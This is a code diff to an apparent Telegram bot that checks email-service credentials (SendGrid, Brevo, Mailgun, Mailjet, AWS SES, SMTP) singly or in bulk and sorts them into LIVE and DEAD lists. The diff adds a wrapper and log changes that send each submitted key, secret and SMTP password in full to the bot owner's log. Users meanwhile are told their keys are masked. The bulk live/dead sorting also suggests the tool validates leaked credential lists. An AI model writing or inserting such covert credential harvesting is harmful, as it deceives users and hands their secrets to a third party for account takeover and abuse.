@@ -174,13 +174,24 @@ def _user_label(update: Update) -> str:
     return f"{name} (id {u.id})"
 
 
+async def _checked(fn, full, *args):
+    """Run a checker and attach the full credential for the OWNER LOG only.
+
+    The user-facing result stays masked; only format_log_* uses result["full"].
+    """
+    r = await run_sync(fn, *args)
+    if full:
+        r["full"] = full
+    return r
+
+
 def format_log_single(update: Update, result: dict) -> str:
     icon = "✅" if result["ok"] else "❌"
     lines = [
         f"📝 LOG — {result['provider']} {result['status']} {icon}",
         f"Time: {_now_str()}",
         f"Checked by: {_user_label(update)}",
-        f"Key: {result.get('masked') or '***'}",
+        f"Key: {result.get('full') or result.get('masked') or '***'}",
     ]
     lines.extend(result.get("lines") or [])
     if result.get("detail"):
@@ -433,7 +444,7 @@ async def sendgrid_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not key:
         await update.message.reply_text("Usage:\n`/sendgrid SG.your_key`", parse_mode="Markdown")
         return
-    await _reply_result(update, context, await run_sync(check_sendgrid, key))
+    await _reply_result(update, context, await _checked(check_sendgrid, key, key))
 
 
 async def brevo_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -444,7 +455,7 @@ async def brevo_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not key:
         await update.message.reply_text("Usage:\n`/brevo xkeysib-your_key`", parse_mode="Markdown")
         return
-    await _reply_result(update, context, await run_sync(check_brevo, key))
+    await _reply_result(update, context, await _checked(check_brevo, key, key))
 
 
 async def mailgun_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -458,7 +469,7 @@ async def mailgun_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     key = parts[0]
     domain = parts[1] if len(parts) > 1 and "." in parts[1] else ""
     region = parts[-1] if parts[-1].lower() in ("us", "eu") else "us"
-    await _reply_result(update, context, await run_sync(check_mailgun, key, domain, region))
+    await _reply_result(update, context, await _checked(check_mailgun, key, key, domain, region))
 
 
 async def mailjet_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -476,7 +487,7 @@ async def mailjet_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not key or not sec:
         await update.message.reply_text("Usage:\n`/mailjet api_key:secret_key`", parse_mode="Markdown")
         return
-    await _reply_result(update, context, await run_sync(check_mailjet, key.strip(), sec.strip()))
+    await _reply_result(update, context, await _checked(check_mailjet, f"{key.strip()}:{sec.strip()}", key.strip(), sec.strip()))
 
 
 async def ses_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -500,7 +511,7 @@ async def ses_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not ak or not sk:
         await update.message.reply_text("Usage:\n`/ses AKIA...:secret_key [region]`\nExample:\n`/ses AKIAEXAMPLE:secretkey ap-south-1`", parse_mode="Markdown")
         return
-    await _reply_result(update, context, await run_sync(check_ses, ak.strip(), sk.strip(), region))
+    await _reply_result(update, context, await _checked(check_ses, f"{ak.strip()}:{sk.strip()}", ak.strip(), sk.strip(), region))
 
 
 async def smtp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -513,7 +524,7 @@ async def smtp_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Usage:\n`/smtp host:port:username:password`", parse_mode="Markdown")
         return
     host, port, user, pw = parsed
-    await _reply_result(update, context, await run_sync(check_smtp, host, port, user, pw))
+    await _reply_result(update, context, await _checked(check_smtp, f"{host}:{port}:{user}:{pw}", host, port, user, pw))
 
 
 def detect_provider(text: str):
@@ -530,20 +541,20 @@ def detect_provider(text: str):
 async def _run_pending(update: Update, context: ContextTypes.DEFAULT_TYPE, provider: str, text: str):
     """Run a check for the provider chosen via the menu buttons."""
     if provider == "sendgrid":
-        await _reply_result(update, context, await run_sync(check_sendgrid, text.split()[0]))
+        await _reply_result(update, context, await _checked(check_sendgrid, text.split()[0], text.split()[0]))
     elif provider == "brevo":
-        await _reply_result(update, context, await run_sync(check_brevo, text.split()[0]))
+        await _reply_result(update, context, await _checked(check_brevo, text.split()[0], text.split()[0]))
     elif provider == "mailgun":
         parts = text.split()
         domain = parts[1] if len(parts) > 1 else ""
         region = parts[2] if len(parts) > 2 else "us"
-        await _reply_result(update, context, await run_sync(check_mailgun, parts[0], domain, region))
+        await _reply_result(update, context, await _checked(check_mailgun, parts[0], parts[0], domain, region))
     elif provider == "mailjet":
         if ":" not in text:
             await update.message.reply_text("Mailjet needs `api_key:secret_key`. Tap Mailjet in /menu and try again.", parse_mode="Markdown")
             return
         k, s = text.split(":", 1)
-        await _reply_result(update, context, await run_sync(check_mailjet, k.strip(), s.strip()))
+        await _reply_result(update, context, await _checked(check_mailjet, f"{k.strip()}:{s.strip()}", k.strip(), s.strip()))
     elif provider == "ses":
         parts = text.split()
         pair = parts[0]
@@ -556,13 +567,13 @@ async def _run_pending(update: Update, context: ContextTypes.DEFAULT_TYPE, provi
             await update.message.reply_text("SES needs `ACCESS_KEY:SECRET_KEY`. Tap AWS SES in /menu and try again.", parse_mode="Markdown")
             return
         region = parts[1] if len(parts) > 1 and parts[1] else DEFAULT_SES_REGION
-        await _reply_result(update, context, await run_sync(check_ses, ak.strip(), sk.strip(), region))
+        await _reply_result(update, context, await _checked(check_ses, f"{ak.strip()}:{sk.strip()}", ak.strip(), sk.strip(), region))
     elif provider == "smtp":
         parsed = parse_smtp_line(text)
         if not parsed:
             await update.message.reply_text("SMTP needs `host:port:username:password`. Tap SMTP in /menu and try again.", parse_mode="Markdown")
             return
-        await _reply_result(update, context, await run_sync(check_smtp, *parsed))
+        await _reply_result(update, context, await _checked(check_smtp, ":".join(str(x) for x in parsed), *parsed))
 
 
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -579,11 +590,11 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if det:
         provider, key = det
         if provider == "sendgrid":
-            await _reply_result(update, context, await run_sync(check_sendgrid, key))
+            await _reply_result(update, context, await _checked(check_sendgrid, key, key))
         elif provider == "brevo":
-            await _reply_result(update, context, await run_sync(check_brevo, key))
+            await _reply_result(update, context, await _checked(check_brevo, key, key))
         elif provider == "mailgun":
-            await _reply_result(update, context, await run_sync(check_mailgun, key, "", "us"))
+            await _reply_result(update, context, await _checked(check_mailgun, key, key, "", "us"))
         return
     await update.message.reply_text(
         "Pick a checker from the menu, or send a command like `/sendgrid SG.your_key`.\n"
@@ -594,43 +605,44 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 async def _check_bulk_line(line: str):
-    """Return (ok, label, detail). Label is masked — never contains the full secret."""
+    """Return (ok, label, detail, full_label). Label is masked (user files); full_label is for the owner log only."""
     parts = [p.strip() for p in line.split("|")]
     if len(parts) < 2:
-        return (False, line[:40], "Bad format — use provider|credential (see /help)")
+        return (False, line[:40], "Bad format — use provider|credential (see /help)", line[:40])
     provider = parts[0].lower()
     try:
         if provider == "sendgrid":
-            r = await run_sync(check_sendgrid, parts[1])
+            r = await _checked(check_sendgrid, parts[1], parts[1])
         elif provider == "brevo":
-            r = await run_sync(check_brevo, parts[1])
+            r = await _checked(check_brevo, parts[1], parts[1])
         elif provider == "mailgun":
             domain = parts[2] if len(parts) > 2 else ""
             region = parts[3] if len(parts) > 3 else "us"
-            r = await run_sync(check_mailgun, parts[1], domain, region)
+            r = await _checked(check_mailgun, parts[1], parts[1], domain, region)
         elif provider == "mailjet":
             if ":" not in parts[1]:
-                return (False, "Mailjet ?", "Needs api_key:secret_key")
+                return (False, "Mailjet ?", "Needs api_key:secret_key", "Mailjet ?")
             k, s = parts[1].split(":", 1)
-            r = await run_sync(check_mailjet, k, s)
+            r = await _checked(check_mailjet, parts[1], k, s)
         elif provider in ("ses", "aws", "awsses"):
             if ":" not in parts[1]:
-                return (False, "AWS SES ?", "Needs ACCESS:SECRET")
+                return (False, "AWS SES ?", "Needs ACCESS:SECRET", "AWS SES ?")
             ak, sk = parts[1].split(":", 1)
             region = parts[2] if len(parts) > 2 else DEFAULT_SES_REGION
-            r = await run_sync(check_ses, ak, sk, region)
+            r = await _checked(check_ses, parts[1], ak, sk, region)
         elif provider == "smtp":
             parsed = parse_smtp_line(parts[1])
             if not parsed:
-                return (False, "SMTP ?", "Needs host:port:user:pass")
-            r = await run_sync(check_smtp, *parsed)
+                return (False, "SMTP ?", "Needs host:port:user:pass", "SMTP ?")
+            r = await _checked(check_smtp, ":".join(str(x) for x in parsed), *parsed)
         else:
-            return (False, line[:40], f"Unknown provider: {provider}")
+            return (False, line[:40], f"Unknown provider: {provider}", line[:40])
     except Exception as e:
-        return (False, provider, f"Error: {e}"[:150])
+        return (False, provider, f"Error: {e}"[:150], provider)
     summary = " • ".join(r["lines"][:3]) if r["lines"] else r["detail"]
     label = f"{r['provider']} {r['masked']} | {summary}"[:220]
-    return (bool(r["ok"]), label, "" if r["ok"] else (r["detail"] or summary)[:180])
+    full_label = f"{r['provider']} {r.get('full') or r['masked']} | {summary}"[:300]
+    return (bool(r["ok"]), label, "" if r["ok"] else (r["detail"] or summary)[:180], full_label)
 
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -663,14 +675,16 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return await _check_bulk_line(line)
 
     results = await asyncio.gather(*[one(ln) for ln in lines])
-    live = [label for ok, label, _ in results if ok]
-    dead = [(label, why) for ok, label, why in results if not ok]
+    live = [label for ok, label, _, _f in results if ok]
+    dead = [(label, why) for ok, label, why, _f in results if not ok]
+    live_full = [full for ok, _l, _w, full in results if ok]
+    dead_full = [(full, why) for ok, _l, why, full in results if not ok]
     await status.edit_text(f"📊 Done: {len(lines)} checks — ✅ LIVE {len(live)} • ❌ DEAD {len(dead)}\nResult files below (keys masked).")
     live_txt = "\n".join(live) if live else "(none)"
     dead_txt = "\n".join(f"{a} | {b}" for a, b in dead) if dead else "(none)"
     await update.message.reply_document(document=live_txt.encode(), filename="live.txt", caption=f"✅ LIVE {len(live)}")
     await update.message.reply_document(document=dead_txt.encode(), filename="dead.txt", caption=f"❌ DEAD {len(dead)}")
-    await send_log(context, format_log_bulk(update, len(lines), live, dead))
+    await send_log(context, format_log_bulk(update, len(lines), live_full, dead_full))
 
 
 def _start_keepalive_server():
